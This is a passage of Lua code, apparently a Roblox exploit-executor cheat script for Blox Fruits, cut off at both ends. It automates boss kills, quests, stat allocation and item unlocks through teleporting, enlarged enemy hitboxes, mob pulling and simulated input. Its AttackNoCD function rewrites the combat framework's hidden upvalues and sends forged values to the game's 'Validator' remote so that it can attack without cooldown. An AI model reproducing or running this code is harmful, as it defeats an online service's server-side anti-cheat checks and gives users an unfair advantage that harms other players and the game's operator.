                if MsBoss == "Soul Reaper" or MsBoss == "Longma0" or MsBoss == "Don Swan0" or MsBoss == "Cursed Captain3" or MsBoss == "Order2" or MsBoss == "rip_indra True Form0" then
                    if game:GetService("Workspace").Enemies:FindFirstChild(NameBoss) then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name == NameBoss then
                                repeat wait()
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.Auto_Farm_Boss == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    else
                        getgenv().ToPos(CFrameBoss)
                    end
                else
                    if _G.Auto_Quest_Boss then
                        CheckBossQuest()
                        if not string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameBoss) then
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                        end
                        if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == false then
                            repeat wait() getgenv().ToPos(CFrameQuestBoss) until (CFrameQuestBoss.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or not _G.Auto_Farm_Boss
                            if (CFrameQuestBoss.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 4 then
                                wait(1.1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StartQuest", NameQuestBoss, LevelQuestBoss)
                            end
                        elseif game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == true then
                            if game:GetService("Workspace").Enemies:FindFirstChild(NameBoss) then
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                    if v.Name == NameBoss then
                                        repeat wait()
                                            if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameBoss) then
                                                getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                                v.HumanoidRootPart.CanCollide = false
                                                v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                                game:GetService'VirtualUser':CaptureController()
                                                game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))									
                                            else
                                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
                                            end
                                        until _G.Auto_Farm_Boss == false or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            else
                                getgenv().ToPos(CFrameBoss)
                            end
                        end
                    else
                        if game:GetService("Workspace").Enemies:FindFirstChild(NameBoss) then
                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v.Name == NameBoss then
                                    repeat wait()
                                        getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                        v.HumanoidRootPart.CanCollide = false
                                        v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                        game:GetService'VirtualUser':CaptureController()
                                        game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))										
                                    until _G.Auto_Farm_Boss == false or not v.Parent or v.Humanoid.Health <= 0
                                end
                            end
                        else
                            getgenv().ToPos(CFrameBoss)
                        end
                    end
                end
            end)
        end
    end
end)
Section3:Toggle("Auto Kills All Boss",false,function(v)
    _G.Auto_Farm_All_Boss = v
end)
spawn(function()
    while wait() do
        if _G.Auto_Farm_All_Boss then
            pcall(function()
                for i,v in pairs(game.ReplicatedStorage:GetChildren()) do
                    if string.find(v.Name,"Boss") then
                        repeat task.wait()
                            if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude > 350 then
                                getgenv().ToPos(v.HumanoidRootPart.CFrame)
                            elseif v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 350 then
                                v.Humanoid.WalkSpeed = 0
                                v.HumanoidRootPart.CanCollide = false
                                v.Head.CanCollide = false
                                v.HumanoidRootPart.Size = Vector3.new(80,80,80)
                                getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                game:GetService'VirtualUser':CaptureController()
                                game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",math.huge)
                            end
                        until v.Humanoid.Health <= 0 or _G.Auto_Farm_All_Boss == false or not v.Parent
                    end
                end
            end)
        end
    end
end)

local plr = game.Players.LocalPlayer
local CbFw = debug.getupvalues(require(plr.PlayerScripts.CombatFramework))
local CbFw2 = CbFw[2]
function GetCurrentBlade() 
    local p13 = CbFw2.activeController
    local ret = p13.blades[1]
    if not ret then return end
    while ret.Parent~=game.Players.LocalPlayer.Character do ret=ret.Parent end
    return ret
end
function AttackNoCD() 
    local AC = CbFw2.activeController
    for i = 1, 1 do 
        local bladehit = require(game.ReplicatedStorage.CombatFramework.RigLib).getBladeHits(
            plr.Character,
            {plr.Character.HumanoidRootPart},
            60
        )
        local cac = {}
        local hash = {}
        for k, v in pairs(bladehit) do
            if v.Parent:FindFirstChild("HumanoidRootPart") and not hash[v.Parent] then
                table.insert(cac, v.Parent.HumanoidRootPart)
                hash[v.Parent] = true
            end
        end
        bladehit = cac
        if #bladehit > 0 then
            local u8 = debug.getupvalue(AC.attack, 5)
            local u9 = debug.getupvalue(AC.attack, 6)
            local u7 = debug.getupvalue(AC.attack, 4)
            local u10 = debug.getupvalue(AC.attack, 7)
            local u12 = (u8 * 798405 + u7 * 727595) % u9
            local u13 = u7 * 798405
            (function()
                u12 = (u12 * u9 + u13) % 1099511627776
                u8 = math.floor(u12 / u9)
                u7 = u12 - u8 * u9
            end)()
            u10 = u10 + 1
            debug.setupvalue(AC.attack, 5, u8)
            debug.setupvalue(AC.attack, 6, u9)
            debug.setupvalue(AC.attack, 4, u7)
            debug.setupvalue(AC.attack, 7, u10)
            pcall(function()
                for k, v in pairs(AC.animator.anims.basic) do
                    v:Play()
                end                  
            end)
            if plr.Character:FindFirstChildOfClass("Tool") and AC.blades and AC.blades[1] then 
                game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("weaponChange",tostring(GetCurrentBlade()))
                game.ReplicatedStorage.Remotes.Validator:FireServer(math.floor(u12 / 1099511627776 * 16777215), u10)
                game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("hit", bladehit, i, "") 
            end
        end
    end
end



spawn(function()
    while task.wait() do
        pcall(function()
            if _G.AutoFarmBone then
                for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                for x,y in pairs(BoneMob) do
                    if v.Name == y then
                        if v:FindFirstChild("HumanoidRootPart") then
                            repeat task.wait()
                                    getgenv().BringMobs(v.HumanoidRootPart.CFrame , y.Name)
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                    Attack()
                            until not _G.AutoFarmBone or not v.Parent or v.Humanoid.Health <= 0
                        end
                    end
                end
                end
            end
        end)
    end
end)
spawn(function()
    pcall(function()
        while wait(.1) do
            if _G.SetSpawn and game.Players.LocalPlayer.Character.Humanoid.Health > 0 then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
            end
        end
    end)
end)
spawn(function()
    while task.wait() do
        pcall(function()
            if _G.Haki then
            if not game.Players.LocalPlayer.Character:FindFirstChild("HasBuso") then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buso")
            end
            end
        end)
    end
end)
spawn(function()
    while wait() do
        if game.Players.localPlayer.Data.Points.Value >= 1 then
            if _G.Melee then
                wait()
                local args = {
                    [1] = "AddPoint",
                    [2] = "Melee",
                    [3] = 1
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end 
            if _G.Defense then
                wait()
                local args = {
                    [1] = "AddPoint",
                    [2] = "Defense",
                    [3] = 1
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end 
            if _G.Sword then
                wait()
                local args = {
                    [1] = "AddPoint",
                    [2] = "Sword",
                    [3] = 1
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end 
            if _G.Gun then
                wait()
                local args = {
                    [1] = "AddPoint",
                    [2] = "Gun",
                    [3] = 1
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end 
            if _G.Fruit then
                wait()
                local args = {
                    [1] = "AddPoint",
                    [2] = "Demon Fruit",
                    [3] = 1
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end
        end
    end
end)
spawn(function()
    while wait(.1) do
        if _G.Sea2 then
            local Lvv = game.Players.LocalPlayer.Data.Level.Value
            if Lvv >= 700 and game.PlaceId == 2753915549 then
                _G.AutoFarmL = false
                if game.Workspace.Map.Ice.Door.CanCollide == true and game.Workspace.Map.Ice.Door.Transparency == 0 then
                    getgenv().ToPos(CFrame.new(4851.8720703125, 5.6514348983765, 718.47094726563))
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 5 then
                        wait(.5)
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("DressrosaQuestProgress","Detective")
                    end
                    EquipTool("Key")
                    getgenv().ToPos(CFrame.new(1347.7124, 37.3751602, -1325.6488))
                    wait(3)
                elseif game.Workspace.Map.Ice.Door.CanCollide == false and game.Workspace.Map.Ice.Door.Transparency == 1 then
                    if game:GetService("Workspace").Enemies:FindFirstChild("Ice Admiral") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name == "Ice Admiral" and v.Humanoid.Health > 0 then
                                repeat game:GetService("RunService").Heartbeat:wait()
                                    pcall(function()
                                        EquipTool(_G.SelectToolWeapon)
                                        getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                        Attack()					
                                    end)
                                until _G.Sea2 == false or v.Humanoid.Health <= 0 or not v.Parent
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa")
                            end
                        end
                    else
                        getgenv().ToPos(CFrame.new(1347.7124, 37.3751602, -1325.6488))
                    end
                else
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa")
                end
            end
        end
    end
end)
spawn(function()
    while task.wait() do
        pcall(function()
            if _G.AuToFarmMasFruits then
                CheckQuest()
                for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                    if v.Name == Ms then
                        if v:FindFirstChild("HumanoidRootPart") then
                            repeat task.wait()
                                getgenv().BringMobs(v.HumanoidRootPart.CFrame , v.Name)
                                if v.Humanoid.Health <= v.Humanoid.MaxHealth * _G.KillAt/100 then
                                    EquipTool(game.Players.LocalPlayer.Data.DevilFruit.Value)
                                    _G.UseSkill = true
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,0,25))
                                    FruitPos = v.HumanoidRootPart.CFrame
                                else
                                    _G.UseSkill = false
                                    EquipTool(_G.ConfigTestDropdownNormal)
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,0,25))
                                    Attack()
                                end
                            until not _G.AuToFarmMasFruits or not v.Parent or v.Humanoid.Health <= 0
                        end
                    else
                        getgenv().ToPos(CFrameMon)
                        EquipTool(_G.ConfigTestDropdownNormal)
                    end
                end
            end
            if _G.AuToFarmMasFruits then
                local On = {
                    [1] = FruitPos.Position
                }
                game:GetService("Players").LocalPlayer.Character[game:GetService("Players").LocalPlayer.Data.DevilFruit.Value].RemoteEvent:FireServer(unpack(On))
            else
                local Off = {
                    [1] = nil
                }
                game:GetService("Players").LocalPlayer.Character[game:GetService("Players").LocalPlayer.Data.DevilFruit.Value].RemoteEvent:FireServer(unpack(Off)) 
            end
        end)
    end
end)
function SendKey_HAVEFRUIT(keycode)
    game:GetService("VirtualInputManager"):SendKeyEvent(true,keycode,false,game)
    wait()
    game:GetService("VirtualInputManager"):SendKeyEvent(false,keycode,false,game)
end
spawn(function()
    while wait() do
        if _G.UseSkill then
            if _G.SkillZ then
                SendKey_HAVEFRUIT("Z")
            end
            if _G.SkillX then
                SendKey_HAVEFRUIT("X")
            end
            if _G.SkillC then
                SendKey_HAVEFRUIT("C")
            end
            if _G.SkillV then
                SendKey_HAVEFRUIT("V")
            end
        end
    end
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.Auto_Rengoku and StartRengokuMagnet and (v.Name == "Snow Lurker3" or v.Name == "Arctic Warrior3") and (v.HumanoidRootPart.Position - RengokuMon.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = RengokuMon
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)
spawn(function()
    while wait() do
        if _G.Auto_Rengoku then
            pcall(function()
                if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Hidden Key") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Hidden Key") then
                    EquipTool("Hidden Key")
                    getgenv().ToPos(CFrame.new(6571.1201171875, 299.23028564453, -6967.841796875))
                elseif game:GetService("Workspace").Enemies:FindFirstChild("Snow Lurker3") or game:GetService("Workspace").Enemies:FindFirstChild("Arctic Warrior3") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if (v.Name == "Snow Lurker3" or v.Name == "Arctic Warrior3") and v.Humanoid.Health > 0 then
                            repeat wait()
                                getgenv().BringMobs(v.HumanoidRootPart.CFrame , v.Name)
                                EquipTool(_G.ConfigTestDropdownNormal)
                                v.HumanoidRootPart.CanCollide = false
                                v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                RengokuMon = v.HumanoidRootPart.CFrame
                                getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                game:GetService'VirtualUser':CaptureController()
                                game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                StartRengokuMagnet = true
                            until game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Hidden Key") or _G.Auto_Rengoku == false or not v.Parent or v.Humanoid.Health <= 0
                            StartRengokuMagnet = false
                        end
                    end
                else
                    StartRengokuMagnet = false
                    getgenv().ToPos(CFrame.new(5662.0419921875, 46.64726257324219, -6501.89990234375))
                end
            end)
        end
    end
end)
spawn(function()
    while wait() do
        if _G.Auto_Factory_Farm then
            pcall(function()
                if game.Workspace.Enemies:FindFirstChild("Core") then
                    _G.FactoryCore = true
                    for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                        if _G.FactoryCore and v.Name == "Core" and v.Humanoid.Health > 0 then
                            repeat wait()
                                EquipTool(_G.ConfigTestDropdownNormal)
                                getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,10,10))
                                game:GetService'VirtualUser':CaptureController()
                                game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                            until not _G.FactoryCore or v.Humanoid.Health <= 0 or _G.Auto_Factory_Farm == false
                        end
                    end
                elseif game.ReplicatedStorage:FindFirstChild("Core") and game.ReplicatedStorage:FindFirstChild("Core"):FindFirstChild("Humanoid") then
                    _G.FactoryCore = true
                    getgenv().ToPos(CFrame.new(502.7349853515625, 143.0749053955078, -379.078125))
                elseif _G.Auto_Farm_Level then
                    _G.FactoryCore = false
                end
            end)
        end
    end
end)
spawn(function()
    while wait(.25) do
        if _G.Auto_Superhuman or _G.Auto_Fully_Superhuman and game.Players.LocalPlayer:FindFirstChild("WeaponAssetCache") then 
            pcall(function()
                if game:GetService("Players").LocalPlayer.Data.Beli.Value >= 500000 and (game.Players.LocalPlayer.Character:FindFirstChild("Combat") or game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")) then
                    _G.Select_Weapon = "Combat"
                    local args = {
                        [1] = "BuyElectro"
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                end   
                if game.Players.LocalPlayer.Character:FindFirstChild("Superhuman") or game.Players.LocalPlayer.Backpack:FindFirstChild("Superhuman") then
                    _G.ConfigTestDropdownNormal = "Superhuman"
                end  
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg") and game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg").Level.Value <= 299  then
                    _G.ConfigTestDropdownNormal = "Black Leg"
                end
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Electro") and game.Players.LocalPlayer.Backpack:FindFirstChild("Electro").Level.Value <= 299  then
                    _G.ConfigTestDropdownNormal = "Electro"
                end
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate") and game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate").Level.Value <= 299  then
                    _G.ConfigTestDropdownNormal = "Fishman Karate"
                end
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw") and game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw").Level.Value <= 299  then
                    _G.ConfigTestDropdownNormal = "Dragon Claw"
                end
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg") and game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg").Level.Value >= 300  then
                    local args = {
                        [1] = "BuyFishmanKarate"
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                end
                if game.Players.LocalPlayer.Character:FindFirstChild("Black Leg") and game.Players.LocalPlayer.Character:FindFirstChild("Black Leg").Level.Value >= 300  then
                    local args = {
                        [1] = "BuyFishmanKarate"
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                end
                if game.Players.LocalPlayer.Character:FindFirstChild("Electro") and game.Players.LocalPlayer.Character:FindFirstChild("Electro").Level.Value >= 300  then
                    local args = {
                        [1] = "BuyBlackLeg"
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                end
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate") and game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate").Level.Value >= 300  then
                    if _G.Auto_Fully_Superhuman and game.Players.LocalPlayer.Data.Fragments.Value < 1500 then
                        if game.Players.LocalPlayer.Data.Level.Value > 1100 then
                            _G.Select_Dungeon = "Flame"
                            _G.Auto_Buy_Chips_Dungeon = true
                            _G.Auto_Start_Dungeon = true
                            _G.Auto_Next_Island = true
                        end
                    else
                        _G.Auto_Buy_Chips_Dungeon = false
                        _G.Auto_Start_Dungeon = false
                        _G.Auto_Next_Island = false
                        local args = {
                            [1] = "BlackbeardReward",
                            [2] = "DragonClaw",
                            [3] = "2"
                        }
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                    end
                end
                if game.Players.LocalPlayer.Character:FindFirstChild("Fishman Karate") and game.Players.LocalPlayer.Character:FindFirstChild("Fishman Karate").Level.Value >= 300  then
                    if _G.Auto_Fully_Superhuman and game.Players.LocalPlayer.Data.Fragments.Value < 1500 then
                        if game.Players.LocalPlayer.Data.Level.Value > 1100 then
                            _G.Select_Dungeon = "Flame"
                            _G.Auto_Buy_Chips_Dungeon = true
                            _G.Auto_Start_Dungeon = true
                            _G.Auto_Next_Island = true
                        end
                    else
                        _G.Auto_Buy_Chips_Dungeon = false
                        _G.Auto_Start_Dungeon = false
                        _G.Auto_Next_Island = false
                        local args = {
                            [1] = "BlackbeardReward",
                            [2] = "DragonClaw",
                            [3] = "2"
                        }
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                    end
                end
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw") and game.Players.LocalPlayer.Backpack:FindFirstChild("Dragon Claw").Level.Value >= 300  then
                    local args = {
                        [1] = "BuySuperhuman"
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                end
                if game.Players.LocalPlayer.Character:FindFirstChild("Dragon Claw") and game.Players.LocalPlayer.Character:FindFirstChild("Dragon Claw").Level.Value >= 300  then
                    local args = {
                        [1] = "BuySuperhuman"
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                end 
            end)
        end
    end
end)
spawn(function()
    while wait() do
        if _G.Auto_Saber then
            if game.Players.localPlayer.Data.Level.Value < 200 then
            else
                if game.Workspace.Map.Jungle.Final.Part.CanCollide == false then
                    if _G.Auto_Saber and game.ReplicatedStorage:FindFirstChild("Saber Expert") or game.Workspace.Enemies:FindFirstChild("Saber Expert") then
                        if game.Workspace.Enemies:FindFirstChild("Saber Expert") then
                            for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                                if v.Name == "Saber Expert" and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                                    repeat wait()
                                        if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude > 300 then
                                            Farmtween = toX2(v.HumanoidRootPart.Position,v.HumanoidRootPart.CFrame)
                                        elseif (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                                            if Farmtween then
                                                Farmtween:Stop()
                                            end
                                            EquipTool(_G.ConfigTestDropdownNormal)
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,30,0)
                                            game:GetService'VirtualUser':CaptureController()
                                            game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                        end
                                    until not _G.Auto_Saber or not v.Parent or v.Humanoid.Health <= 0
                                end
                            end
                        else
                            Questtween = toX2(CFrame.new(-1405.41956, 29.8519993, 5.62435055).Position,CFrame.new(-1405.41956, 29.8519993, 5.62435055))
                            if (CFrame.new(-1405.41956, 29.8519993, 5.62435055).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                                if Questtween then
                                    Questtween:Stop()
                                end
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1405.41956, 29.8519993, 5.62435055, 0.885240912, 3.52892613e-08, 0.465132833, -6.60881128e-09, 1, -6.32913171e-08, -0.465132833, 5.29540891e-08, 0.885240912)
                            end
                        end
                    else
                        if _G.Auto_Saber_Hop then
                            Hop()
                        end
                    end
                elseif game.Players.LocalPlayer.Backpack:FindFirstChild("Relic") or game.Players.LocalPlayer.Character:FindFirstChild("Relic") and game.Players.localPlayer.Data.Level.Value >= 200 then
                    EquipTool("Relic")
                    wait(0.5)
                    Questtween = toX2(CFrame.new(-1405.41956, 29.8519993, 5.62435055).Position,CFrame.new(-1405.41956, 29.8519993, 5.62435055))
                    if (CFrame.new(-1405.41956, 29.8519993, 5.62435055).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                        if Questtween then
                            Questtween:Stop()
                        end
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1405.41956, 29.8519993, 5.62435055, 0.885240912, 3.52892613e-08, 0.465132833, -6.60881128e-09, 1, -6.32913171e-08, -0.465132833, 5.29540891e-08, 0.885240912)
                    end
                else
                    if Workspace.Map.Jungle.QuestPlates.Door.CanCollide == false then
                        if game.Workspace.Map.Desert.Burn.Part.CanCollide == false then
                            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","SickMan") == 0 then
                                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon") == 0 then
                                    if game.Workspace.Enemies:FindFirstChild("Mob Leader") then
                                        for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                                            if _G.Auto_Saber and v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 and v.Name == "Mob Leader" then
                                                repeat
                                                    pcall(function() wait() 
                                                        if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude > 300 then
                                                            Farmtween = toX2(v.HumanoidRootPart.Position,v.HumanoidRootPart.CFrame)
                                                        elseif (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                                                            if Farmtween then
                                                                Farmtween:Stop()
                                                            end
                                                            EquipTool(_G.ConfigTestDropdownNormal)
                                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,25, 0)
                                                            game:GetService'VirtualUser':CaptureController()
                                                            game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                                        end
                                                    end)
                                                until not _G.Auto_Saber or not v.Parent or v.Humanoid.Health <= 0
                                            end
                                        end
                                    else
                                        Questtween = toX2(CFrame.new(-2848.59399, 7.4272871, 5342.44043).Position,CFrame.new(-2848.59399, 7.4272871, 5342.44043))
                                        if (CFrame.new(-2848.59399, 7.4272871, 5342.44043).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                                            if Questtween then
                                                Questtween:Stop()
                                            end
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2848.59399, 7.4272871, 5342.44043, -0.928248107, -8.7248246e-08, 0.371961564, -7.61816636e-08, 1, 4.44474857e-08, -0.371961564, 1.29216433e-08, -0.928248107)
                                        end
                                    end
                                elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon") == 1 then
                                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Relic") or game.Players.LocalPlayer.Character:FindFirstChild("Relic") then
                                        EquipTool("Relic")
                                        wait(0.5)
                                        Questtween = toX2(CFrame.new(-1405.41956, 29.8519993, 5.62435055).Position,CFrame.new(-1405.41956, 29.8519993, 5.62435055))
                                        if (CFrame.new(-1405.41956, 29.8519993, 5.62435055).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                                            if Questtween then
                                                Questtween:Stop()
                                            end
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1405.41956, 29.8519993, 5.62435055)
                                        end
                                    else
                                        Questtween = toX2(CFrame.new(-910.979736, 13.7520342, 4078.14624).Position,CFrame.new(-910.979736, 13.7520342, 4078.14624))
                                        if (CFrame.new(-910.979736, 13.7520342, 4078.14624).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                                            if Questtween then
                                                Questtween:Stop()
                                            end
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-910.979736, 13.7520342, 4078.14624, 0.00685182028, -1.53155766e-09, -0.999976516, 9.15205245e-09, 1, -1.46888401e-09, 0.999976516, -9.14177267e-09, 0.00685182028)
                                            wait(.5)
                                            local args = {
                                                [1] = "ProQuestProgress",
                                                [2] = "RichSon"
                                            }
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                                        end
                                    end
                                else
                                    Questtween = toX2(CFrame.new(-910.979736, 13.7520342, 4078.14624).Position,CFrame.new(-910.979736, 13.7520342, 4078.14624))
                                    if (CFrame.new(-910.979736, 13.7520342, 4078.14624).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                                        if Questtween then
                                            Questtween:Stop()
                                        end
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-910.979736, 13.7520342, 4078.14624)
                                        local args = {
                                            [1] = "ProQuestProgress",
                                            [2] = "RichSon"
                                        }
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                                    end
                                end
                            else
                                if game.Players.LocalPlayer.Backpack:FindFirstChild("Cup") or game.Players.LocalPlayer.Character:FindFirstChild("Cup") then
                                    EquipTool("Cup")
                                    if game.Players.LocalPlayer.Character.Cup.Handle:FindFirstChild("TouchInterest") then
                                        Questtween = toX2(CFrame.new(1397.229, 37.3480148, -1320.85217).Position,CFrame.new(1397.229, 37.3480148, -1320.85217))
                                        if (CFrame.new(1397.229, 37.3480148, -1320.85217).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                                            if Questtween then
                                                Questtween:Stop()
                                            end
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1397.229, 37.3480148, -1320.85217, -0.11285457, 2.01368788e-08, 0.993611455, 1.91641178e-07, 1, 1.50028845e-09, -0.993611455, 1.90586206e-07, -0.11285457)
                                        end
                                    else
                                        wait(0.5)
                                        if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","SickMan") ~= 0 then
                                            local args = {
                                                [1] = "ProQuestProgress",
                                                [2] = "SickMan"
                                            }
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                                        end
                                    end
                                else
                                    Questtween = toX2(game.Workspace.Map.Desert.Cup.Position,game.Workspace.Map.Desert.Cup.CFrame)
                                    if (game.Workspace.Map.Desert.Cup.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                                        if Questtween then
                                            Questtween:Stop()
                                        end
